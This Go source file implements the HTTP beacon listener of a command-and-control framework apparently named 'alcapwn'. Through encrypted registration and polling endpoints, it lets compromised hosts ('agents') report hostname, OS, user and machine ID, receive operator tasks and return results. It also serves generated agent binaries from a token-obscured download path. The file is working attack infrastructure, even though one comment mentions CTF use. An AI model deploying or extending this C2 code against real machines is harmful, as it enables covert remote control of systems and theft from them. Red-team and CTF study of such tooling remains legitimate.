package main

// listener_http.go — HTTP beacon C2 listener.
//
// Agents using the HTTP transport register via POST /register and then poll
// for tasks / submit results via GET|POST /beacon/{token}.
//
// Wire protocol
// ─────────────
// POST /register
//   Request  body : [32-byte agent ephemeral X25519 pubkey] [JSON proto.Hello]
//   Response body : [32-byte server X25519 pubkey]
//                   [4-byte len][AES-256-GCM encrypted proto.Welcome envelope]
//
// GET /beacon/{token}
//   Response 200  : [4-byte len][encrypted proto.Task envelope]  — task pending
//   Response 204  : no task; agent should sleep interval±jitter and retry
//
// POST /beacon/{token}
//   Request  body : [4-byte len][encrypted proto.Result envelope]
//   Response 200  : OK
//
// The AES-256-GCM keys are derived exactly as for the TCP transport (HKDF-SHA256,
// same direction labels), so proto.WriteMsgEncrypted / ReadMsgEncrypted work
// identically over bytes.Buffer / bytes.Reader.

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"alcapwn/proto"
)

// ── HTTP listener registry ────────────────────────────────────────────────────

type httpListenerEntry struct {
	addr           string
	server         *http.Server
	registerPath   string // e.g. "/register"
	beaconPath     string // e.g. "/beacon/" (trailing slash for prefix match)
	downloadPath   string // e.g. "/download/a7f3b2/" (with random token)
	downloadDir    string // directory to serve files from (can be empty = disabled)
	downloadToken  string // random 6-char token for download path obscurity
	allowedFiles   map[string]bool // whitelist of filenames that can be downloaded
	useTLS         bool            // true when served over TLS
}

type httpListenerRegistry struct {
	mu        sync.Mutex
	listeners map[string]*httpListenerEntry
}

func newHTTPListenerRegistry() *httpListenerRegistry {
	return &httpListenerRegistry{listeners: make(map[string]*httpListenerEntry)}
}

func (r *httpListenerRegistry) add(addr string, entry *httpListenerEntry) bool {
	r.mu.Lock()
	defer r.mu.Unlock()
	if _, exists := r.listeners[addr]; exists {
		return false
	}
	r.listeners[addr] = entry
	return true
}

func (r *httpListenerRegistry) remove(addr string) *httpListenerEntry {
	r.mu.Lock()
	defer r.mu.Unlock()
	e := r.listeners[addr]
	delete(r.listeners, addr)
	return e
}

func (r *httpListenerRegistry) all() []string {
	r.mu.Lock()
	defer r.mu.Unlock()
	addrs := make([]string, 0, len(r.listeners))
	for addr := range r.listeners {
		addrs = append(addrs, addr)
	}
	return addrs
}

// ── Start / Stop ──────────────────────────────────────────────────────────────

// StartHTTPListener starts an HTTP C2 listener on addr and registers it.
// registerPath and beaconPath are the URI prefixes agents use (e.g. "/register"
// and "/beacon/").  Pass empty strings to use the defaults.
// downloadDir is an optional directory to serve static files from (e.g. generated agents).
func (c *Console) StartHTTPListener(addr, registerPath, beaconPath, downloadDir string, tlsCfg *tls.Config) error {
	if registerPath == "" {
		registerPath = "/register"
	}
	if beaconPath == "" {
		beaconPath = "/beacon/"
	}
	// Ensure beacon path ends with "/" so net/http prefix-matches token sub-paths.
	if len(beaconPath) > 0 && beaconPath[len(beaconPath)-1] != '/' {
		beaconPath += "/"
	}

	// Generate download token and path if downloadDir is provided.
	var downloadPath, downloadToken string
	if downloadDir != "" {
		downloadToken = generateDownloadToken()
		downloadPath = "/download/" + downloadToken + "/"
	}

	mux := http.NewServeMux()
	mux.HandleFunc(registerPath, c.handleHTTPRegister)
	mux.HandleFunc(beaconPath, c.handleHTTPBeacon)
	if downloadPath != "" {
		mux.HandleFunc(downloadPath, c.handleHTTPDownload)
	}

	srv := &http.Server{
		Addr:         addr,
		Handler:      mux,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 30 * time.Second,
	}
	entry := &httpListenerEntry{
		addr:          addr,
		server:        srv,
		registerPath:  registerPath,
		beaconPath:    beaconPath,
		downloadPath:  downloadPath,
		downloadDir:   downloadDir,
		downloadToken: downloadToken,
		allowedFiles:  make(map[string]bool),
		useTLS:        tlsCfg != nil,
	}
	if !c.httpListeners.add(addr, entry) {
		return fmt.Errorf("already listening on %s", addr)
	}

	go func() {
		var serveErr error
		if tlsCfg != nil {
			ln, err := net.Listen("tcp", addr)
			if err != nil {
				c.printer.Notify("[!] HTTPS listener %s: %v", addr, err)
				c.httpListeners.remove(addr)
				return
			}
			// Record the real bound address (important when addr uses port :0).
			// Re-key the registry entry from the original addr ("127.0.0.1:0") to
			// the OS-assigned address so lookups and StopHTTPListener work correctly.
			realAddr := ln.Addr().String()
			if realAddr != addr {
				c.httpListeners.mu.Lock()
				if e, ok := c.httpListeners.listeners[addr]; ok {
					e.addr = realAddr
					delete(c.httpListeners.listeners, addr)
					c.httpListeners.listeners[realAddr] = e
				}
				c.httpListeners.mu.Unlock()
			}
			tlsLn := tls.NewListener(ln, tlsCfg)
			serveErr = srv.Serve(tlsLn)
			if serveErr != nil && serveErr != http.ErrServerClosed {
				c.printer.Notify("[!] HTTPS listener %s: %v", realAddr, serveErr)
			}
			c.httpListeners.remove(realAddr)
		} else {
			serveErr = srv.ListenAndServe()
			if serveErr != nil && serveErr != http.ErrServerClosed {
				c.printer.Notify("[!] HTTP listener %s: %v", addr, serveErr)
			}
			c.httpListeners.remove(addr)
		}
	}()
	return nil
}

// StopHTTPListener gracefully shuts down the HTTP listener on addr.
func (c *Console) StopHTTPListener(addr string) error {
	entry := c.httpListeners.remove(addr)
	if entry == nil {
		return fmt.Errorf("no HTTP listener on %s", addr)
	}
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	return entry.server.Shutdown(ctx)
}

// RegisterDownload adds a filename to the whitelist of downloadable files
// for the HTTP listener at the given address.
func (c *Console) RegisterDownload(addr, filename string) error {
	c.httpListeners.mu.Lock()
	defer c.httpListeners.mu.Unlock()
	entry := c.httpListeners.listeners[addr]
	if entry == nil {
		return fmt.Errorf("no HTTP listener on %s", addr)
	}
	if entry.allowedFiles == nil {
		entry.allowedFiles = make(map[string]bool)
	}
	entry.allowedFiles[filename] = true
	return nil
}

// ── Registration handler ──────────────────────────────────────────────────────

// handleHTTPRegister processes POST /register.
//
// The request body is:  [32-byte agent ephemeral pubkey] [JSON proto.Hello]
// The response body is: [32-byte server pubkey] [encrypted proto.Welcome frame]
//
// The Hello is sent in plaintext because the agent cannot encrypt it before
// both sides have exchanged public keys.  It contains only non-secret metadata
// (hostname, OS, arch, user, uid, machine-id) — acceptable for CTF use.
func (c *Console) handleHTTPRegister(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if c.opts.serverKey == nil {
		http.Error(w, "server not ready", http.StatusServiceUnavailable)
		return
	}

	// Limit: 32-byte pubkey + up to 4 KiB Hello JSON.
	body, err := io.ReadAll(io.LimitReader(r.Body, 32+4096))
	if err != nil || len(body) < 32 {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	agentPubBytes := body[:32]
	helloJSON := body[32:]

	var hello proto.Hello
	if err := json.Unmarshal(helloJSON, &hello); err != nil {
		http.Error(w, "bad hello", http.StatusBadRequest)
		return
	}

	// Derive CryptoSession from the agent's ephemeral pubkey.
	cs, serverPubBytes, err := proto.NewServerCryptoSessionHTTP(c.opts.serverKey, agentPubBytes)
	if err != nil {
		http.Error(w, "handshake failed", http.StatusInternalServerError)
		return
	}

	// Allocate session; always use the real TCP peer address as RemoteAddr.
	// X-Forwarded-For is intentionally ignored: it is attacker-controlled and
	// cannot be trusted when the HTTP listener is directly internet-facing.
	token := newHTTPToken()
	remoteAddr := r.RemoteAddr
	sess := c.registry.AllocateHTTP(token, remoteAddr)
	if sess == nil {
		http.Error(w, "session limit reached", http.StatusServiceUnavailable)
		return
	}

	// Initialise agent session state.
	taskCh := make(chan agentTaskReq, 16)
	sess.mu.Lock()
	sess.IsAgent = true
	sess.AgentMeta = &hello
	sess.agentTaskCh = taskCh
	sess.httpCS = cs
	sess.ListenerAddr = httpListenerAddrFromRequest(r)
	sess.mu.Unlock()

	c.printer.Notify("[+] Agent %d ready (HTTP) — %s  (%s/%s  uid=%s  mid=%s)",
		sess.ID, hello.Hostname, hello.OS, hello.Arch, hello.UID, hello.MachineID)

	// Build response: serverPubKey || encrypted Welcome.
	welcome := proto.Welcome{
		SessionID: sess.ID,
		Interval:  60,
		Jitter:    20,
		Token:     token,
	}
	var buf bytes.Buffer
	buf.Write(serverPubBytes)
	if err := proto.WriteMsgEncrypted(&buf, cs, proto.MsgWelcome, welcome); err != nil {
		c.printer.Notify("[!] Agent %d: encrypt welcome failed: %v", sess.ID, err)
		c.registry.Remove(sess.ID)
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/octet-stream")
	w.WriteHeader(http.StatusOK)
	w.Write(buf.Bytes()) //nolint:errcheck
}

// ── Beacon handler ────────────────────────────────────────────────────────────

// handleHTTPBeacon dispatches GET (task poll) and POST (result submit) for
// /beacon/{token}.
func (c *Console) handleHTTPBeacon(w http.ResponseWriter, r *http.Request) {
	// Strip whichever beacon path prefix this listener was configured with.
	// Fall back to stripping "/beacon/" for handlers registered on the default path.
	token := r.URL.Path
	// Walk the registered listeners to find the matching beacon path.
	c.httpListeners.mu.Lock()
	for _, e := range c.httpListeners.listeners {
		if strings.HasPrefix(token, e.beaconPath) {
			token = strings.TrimPrefix(token, e.beaconPath)
			break
		}
	}
	c.httpListeners.mu.Unlock()
	token = strings.TrimPrefix(token, "/beacon/") // fallback for tests
	if token == "" {
		http.Error(w, "missing token", http.StatusBadRequest)
		return
	}
	sess := c.registry.LookupHTTPToken(token)
	if sess == nil {
		http.Error(w, "unknown session", http.StatusNotFound)
		return
	}

	switch r.Method {
	case http.MethodGet:
		c.handleHTTPPoll(w, sess)
	case http.MethodPost:
		c.handleHTTPResult(w, r, sess)
	default:
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

// handleHTTPPoll serves GET /beacon/{token}.
//
// Performs a non-blocking dequeue from the session's task channel.  If a task
// is waiting it is encrypted and returned (200); otherwise 204 No Content is
// returned so the agent sleeps and retries.
func (c *Console) handleHTTPPoll(w http.ResponseWriter, sess *Session) {
	sess.mu.Lock()
	taskCh := sess.agentTaskCh
	cs := sess.httpCS
	sess.mu.Unlock()

	if taskCh == nil || cs == nil {
		w.WriteHeader(http.StatusNoContent)
		return
	}

	// Non-blocking dequeue — don't block the HTTP worker goroutine.
	var req agentTaskReq
	select {
	case req = <-taskCh:
	default:
		w.WriteHeader(http.StatusNoContent)
		return
	}

	// Encrypt the task into a response body.
	var buf bytes.Buffer
	if err := proto.WriteMsgEncrypted(&buf, cs, proto.MsgTask, req.task); err != nil {
		// Cannot put the task back cleanly; report failure to the waiting caller.
		req.resultCh <- proto.Result{TaskID: req.task.ID, Error: "server encryption error"}
		http.Error(w, "encryption error", http.StatusInternalServerError)
		return
	}

	// Record in-flight task so the next POST /beacon can match the result.
	sess.httpInflightMu.Lock()
	sess.httpInFlight[req.task.ID] = &req
	sess.httpInflightMu.Unlock()

	w.Header().Set("Content-Type", "application/octet-stream")
	w.WriteHeader(http.StatusOK)
	w.Write(buf.Bytes()) //nolint:errcheck
}

// handleHTTPResult serves POST /beacon/{token}.
//
// Decrypts the body as a proto.Result envelope and dispatches it to the
// operator command that issued the task (via the stored resultCh).
func (c *Console) handleHTTPResult(w http.ResponseWriter, r *http.Request, sess *Session) {
	body, err := io.ReadAll(io.LimitReader(r.Body, int64(proto.MaxBodySize)+4))
	if err != nil {
		http.Error(w, "read error", http.StatusBadRequest)
		return
	}

	sess.mu.Lock()
	cs := sess.httpCS
	sess.mu.Unlock()
	if cs == nil {
		http.Error(w, "session not ready", http.StatusBadRequest)
		return
	}

	env, err := proto.ReadMsgEncrypted(bytes.NewReader(body), cs)
	if err != nil {
		http.Error(w, "decryption error", http.StatusBadRequest)
		return
	}
	if env.Type != proto.MsgResult {
		http.Error(w, "expected result", http.StatusBadRequest)
		return
	}
	var res proto.Result
	if err := json.Unmarshal(env.Data, &res); err != nil {
		http.Error(w, "bad result", http.StatusBadRequest)
		return
	}

	sess.httpInflightMu.Lock()
	req, ok := sess.httpInFlight[res.TaskID]
	if ok {
		delete(sess.httpInFlight, res.TaskID)
	}
	sess.httpInflightMu.Unlock()

	if ok && req != nil {
		req.resultCh <- res
	}
	w.WriteHeader(http.StatusOK)
}

// ── Helpers ───────────────────────────────────────────────────────────────────

// newHTTPToken generates a cryptographically random 32-hex-char beacon token.
func newHTTPToken() string {
	var b [16]byte
	if _, err := rand.Read(b[:]); err != nil {
		panic("rand.Read: " + err.Error())
	}
	return hex.EncodeToString(b[:])
}

// generateDownloadToken generates a random 6-char hex token for download path obscurity.
func generateDownloadToken() string {
	var b [3]byte
	if _, err := rand.Read(b[:]); err != nil {
		panic("rand.Read: " + err.Error())
	}
	return hex.EncodeToString(b[:])[:6]
}

// httpListenerAddrFromRequest returns the listener's host:port from the request
// Host header, falling back to the server's Addr field.
func httpListenerAddrFromRequest(r *http.Request) string {
	if r.Host != "" {
		return r.Host
	}
	return r.URL.Host
}

// handleHTTPDownload serves static files from the download directory.
// Requests to /download/{token}/{filename} are served from the listener's downloadDir.
// Only whitelisted files (registered via RegisterDownload) can be served.
func (c *Console) handleHTTPDownload(w http.ResponseWriter, r *http.Request) {
	// URL path is /download/{token}/{filename} — extract token and filename first.
	parts := strings.SplitN(r.URL.Path, "/", 4) // ["", "download", "{token}", "{filename}"]
	if len(parts) < 4 {
		http.Error(w, "invalid path", http.StatusBadRequest)
		return
	}
	token := parts[2]
	filename := parts[3]

	// Look up the listener by download token (host-based matching is unreliable
	// when the listener binds to 0.0.0.0 or an unspecified interface).
	c.httpListeners.mu.Lock()
	var downloadDir string
	var allowedFiles map[string]bool
	for _, e := range c.httpListeners.listeners {
		if e.downloadToken == token {
			downloadDir = e.downloadDir
			allowedFiles = e.allowedFiles
			break
		}
	}
	c.httpListeners.mu.Unlock()

	if downloadDir == "" {
		http.Error(w, "download not configured", http.StatusNotFound)
		return
	}

	// Strip any directory components — only the base filename is permitted.
	filename = filepath.Base(filename)
	if filename == "" || filename == "." || filename == "/" {
		http.Error(w, "invalid filename", http.StatusBadRequest)
		return
	}

	// Check whitelist
	if allowedFiles == nil || !allowedFiles[filename] {
		http.Error(w, "file not allowed", http.StatusForbidden)
		return
	}

	// Serve the file.
	http.ServeFile(w, r, filepath.Join(downloadDir, filename))
}
